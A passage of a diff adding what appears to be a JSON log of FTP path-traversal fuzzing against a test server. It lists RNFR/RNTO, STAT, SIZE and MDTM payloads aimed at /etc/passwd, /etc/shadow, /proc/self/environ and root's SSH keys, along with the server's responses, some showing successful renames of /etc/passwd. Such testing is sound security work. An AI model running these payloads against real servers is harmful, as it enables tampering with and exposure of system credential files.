+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 140,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_139: Is a directory\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 141,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 142,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_141: Is a directory\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 143,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 144,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_143: Is a directory\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 145,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 146,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 147,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../etc/shadow",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 148,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_147: Permission denied\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 149,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../root/.ssh/authorized_keys",
+      "response": "550 ../../../../../root/.ssh/authorized_keys: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 150,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../proc/self/environ",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 151,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_150: Permission denied\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 152,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..%2f",
+      "response": "550 ..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 153,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..%2f..%2f",
+      "response": "550 ..%2f..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 154,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR %2e%2e/",
+      "response": "550 %2e%2e/: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 155,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR %2e%2e%2f",
+      "response": "550 %2e%2e%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 156,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..\\",
+      "response": "550 ..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 157,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..\\..\\",
+      "response": "550 ..\\..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 158,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..%c0%af",
+      "response": "550 ..%c0%af: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 159,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..%c1%9c",
+      "response": "550 ..%c1%9c: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 160,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../etc/passwd\u0000.txt",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 161,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 162,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../etc/passwd%00.txt",
+      "response": "550 ../../../etc/passwd%00.txt: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 163,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ....//",
+      "response": "550 ....//: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 164,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ..../",
+      "response": "550 ..../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 165,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR .../",
+      "response": "550 .../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 166,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 167,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 168,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /etc/shadow",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 169,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_168: Permission denied\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 170,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /root",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 171,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_170: Permission denied\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 172,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /proc/self/cmdline",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 173,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 174,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /proc/self/environ",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 175,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_174: Permission denied\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 176,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ~root",
+      "response": "550 ~root: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 177,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ~root/",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 178,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_177: Permission denied\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 179,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ~root/.bashrc",
+      "response": "550 ~root/.bashrc: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 180,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /home/ftptest/../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 181,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 182,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 183,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 184,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /..",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 185,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_184: Is a directory\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 186,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 187,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 188,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../../../../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 189,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 190,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../",
+      "response": "212-Status of ../:\r\n drwxr-xr-x   5 root     root         4096 Feb 14 01:21 .\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 ..\r\n drwx------   6 ftptest  ftptest      4096 Feb 14 01:29 ftptest\r\n drwx------  21 svc      svc          4096 Feb 14 01:28 svc\r\n drwx------   5 testuser testuser     4096 Feb  9 15:50 testuser\r\n212 End of status\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 191,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../",
+      "response": "212-Status of ../../:\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 .\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 ..\r\n lrwxrwxrwx   1 root     root            7 Jan 29 23:46 bin -> usr/bin\r\n drwxr-xr-x   3 root     root         4096 Jan 30 00:07 boot\r\n drwx------   2 root     root         4096 Jan 29 23:52 .cache\r\n drwxr-xr-x  18 root     root         3280 Feb 13 20:52 dev\r\n drwxr-xr-x 190 root     root        12288 Feb 14 01:21 etc\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 192,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../",
+      "response": "212-Status of ../../../:\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 .\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 ..\r\n lrwxrwxrwx   1 root     root            7 Jan 29 23:46 bin -> usr/bin\r\n drwxr-xr-x   3 root     root         4096 Jan 30 00:07 boot\r\n drwx------   2 root     root         4096 Jan 29 23:52 .cache\r\n drwxr-xr-x  18 root     root         3280 Feb 13 20:52 dev\r\n drwxr-xr-x 190 root     root        12288 Feb 14 01:21 etc\r\n drwxr-xr-x   5 root     root      ",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 193,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../",
+      "response": "212-Status of ../../../../:\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 .\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 ..\r\n lrwxrwxrwx   1 root     root            7 Jan 29 23:46 bin -> usr/bin\r\n drwxr-xr-x   3 root     root         4096 Jan 30 00:07 boot\r\n drwx------   2 root     root         4096 Jan 29 23:52 .cache\r\n drwxr-xr-x  18 root     root         3280 Feb 13 20:52 dev\r\n drwxr-xr-x 190 root     root        12288 Feb 14 01:21 etc\r\n drwxr-xr-x   5 root     root   ",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 194,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../../etc/passwd",
+      "response": "450 ../../../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 195,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../../etc/shadow",
+      "response": "450 ../../../../../etc/shadow: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 196,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../../root/.ssh/authorized_keys",
+      "response": "450 ../../../../../root/.ssh/authorized_keys: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 197,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../../proc/self/environ",
+      "response": "450 ../../../../../proc/self/environ: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 198,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..%2f",
+      "response": "450 ..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 199,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..%2f..%2f",
+      "response": "450 ..%2f..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 200,
+      "category": "path_traversal_STAT",
+      "command": "STAT %2e%2e/",
+      "response": "450 %2e%2e/: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 201,
+      "category": "path_traversal_STAT",
+      "command": "STAT %2e%2e%2f",
+      "response": "450 %2e%2e%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 202,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..\\",
+      "response": "450 ..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 203,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..\\..\\",
+      "response": "450 ..\\..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 204,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..%c0%af",
+      "response": "450 ..%c0%af: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 205,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..%c1%9c",
+      "response": "450 ..%c1%9c: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 206,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../etc/passwd\u0000.txt",
+      "response": "450 ../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 207,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../etc/passwd%00.txt",
+      "response": "450 ../../../etc/passwd%00.txt: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 208,
+      "category": "path_traversal_STAT",
+      "command": "STAT ....//",
+      "response": "450 ....//: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 209,
+      "category": "path_traversal_STAT",
+      "command": "STAT ..../",
+      "response": "450 ..../: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 210,
+      "category": "path_traversal_STAT",
+      "command": "STAT .../",
+      "response": "450 .../: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 211,
+      "category": "path_traversal_STAT",
+      "command": "STAT /etc/passwd",
+      "response": "213-Status of /etc/passwd:\r\n -rw-r--r--   1 root     root         3474 Feb 14 01:21 /etc/passwd\r\n213 End of status\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 212,
+      "category": "path_traversal_STAT",
+      "command": "STAT /etc/shadow",
+      "response": "213-Status of /etc/shadow:\r\n -rw-r-----   1 root     shadow       1687 Feb 14 01:21 /etc/shadow\r\n213 End of status\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 213,
+      "category": "path_traversal_STAT",
+      "command": "STAT /root",
+      "response": "212-Status of /root:\r\n212 End of status\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 214,
+      "category": "path_traversal_STAT",
+      "command": "STAT /proc/self/cmdline",
+      "response": "213-Status of /proc/self/cmdline:\r\n -r--r--r--   1 root     root            0 Feb 14 01:29 /proc/self/cmdline\r\n213 End of status\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 215,
+      "category": "path_traversal_STAT",
+      "command": "STAT /proc/self/environ",
+      "response": "213-Status of /proc/self/environ:\r\n -r--------   1 root     root            0 Feb 14 01:29 /proc/self/environ\r\n213 End of status\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 216,
+      "category": "path_traversal_STAT",
+      "command": "STAT ~root",
+      "response": "450 ~root: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 217,
+      "category": "path_traversal_STAT",
+      "command": "STAT ~root/",
+      "response": "450 ~root/: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 218,
+      "category": "path_traversal_STAT",
+      "command": "STAT ~root/.bashrc",
+      "response": "450 ~root/.bashrc: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 219,
+      "category": "path_traversal_STAT",
+      "command": "STAT /home/ftptest/../../../etc/passwd",
+      "response": "450 /home/ftptest/../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 220,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "450 ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 221,
+      "category": "path_traversal_STAT",
+      "command": "STAT /..",
+      "response": "212-Status of /..:\r\n drwxr-xr-x  19 root     root         4096 Jan 29 23:52 .\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 222,
+      "category": "path_traversal_STAT",
+      "command": "STAT /../../etc/passwd",
+      "response": "450 /../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 223,
+      "category": "path_traversal_STAT",
+      "command": "STAT ../../../../../../../../../../etc/passwd",
+      "response": "450 ../../../../../../../../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 224,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 225,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 226,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 227,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 228,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../../etc/passwd",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 229,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../../etc/shadow",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 230,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../../root/.ssh/authorized_keys",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 231,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../../proc/self/environ",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 232,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..%2f",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 233,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..%2f..%2f",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 234,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE %2e%2e/",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 235,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE %2e%2e%2f",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 236,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..\\",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 237,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..\\..\\",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 238,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..%c0%af",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 239,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..%c1%9c",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 240,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../etc/passwd\u0000.txt",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 241,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../etc/passwd%00.txt",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 242,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ....//",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 243,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ..../",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 244,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE .../",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 245,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /etc/passwd",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 246,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /etc/shadow",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 247,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /root",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 248,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /proc/self/cmdline",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 249,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /proc/self/environ",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 250,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ~root",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 251,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ~root/",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 252,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ~root/.bashrc",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 253,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /home/ftptest/../../../etc/passwd",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 254,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 255,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /..",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 256,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE /../../etc/passwd",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 257,
+      "category": "path_traversal_SIZE",
+      "command": "SIZE ../../../../../../../../../../etc/passwd",
+      "response": "550 SIZE not allowed in ASCII mode\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 258,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../",
+      "response": "550 ../: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 259,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../",
+      "response": "550 ../../: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 260,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../",
+      "response": "550 ../../../: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 261,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../",
+      "response": "550 ../../../../: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 262,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../../etc/passwd",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 263,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../../etc/shadow",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 264,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../../root/.ssh/authorized_keys",
+      "response": "550 ../../../../../root/.ssh/authorized_keys: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 265,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../../proc/self/environ",
+      "response": "213 20260214012937\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 266,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ..%2f",
+      "response": "550 ..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 267,
+      "category": "path_traversal_MDTM",
